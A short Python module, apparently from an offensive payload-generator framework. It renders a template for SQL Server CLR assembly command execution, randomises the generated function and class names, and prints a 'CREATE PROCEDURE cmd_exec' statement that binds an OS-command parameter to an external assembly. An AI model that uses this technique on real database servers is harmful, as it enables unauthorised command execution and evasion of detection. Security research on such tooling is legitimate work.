from typing import ClassVar

from pcr.lib.jinja_helpers import common_filter_random_variable
from pcr.lib.link import BaseBlock


class sql_asm_cmd_exec(BaseBlock):
    yaml_tag: ClassVar[str] = "!csharp.sql_asm_cmd_exec"

    shell: bool = True

    def process(self):
        template = self.load_template(
            "codewriter/CSHARPCode/blocks", "sql_asm_cmd_exec.jinja"
        )
        d, c = self.render_template(template, shell=self.shell)

        function_name = common_filter_random_variable("cmd_exec_fn")
        class_name = common_filter_random_variable("class_name")
        self.print(
            f"cmd_exec: CREATE PROCEDURE \\[dbo].\\[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME \\[ASSEMBLY_NAME].\\[{class_name}].\\[{function_name}];"
        )

        return d, c

    def info(self) -> str:
        return "Add SQL Asembly cmd_exec command"
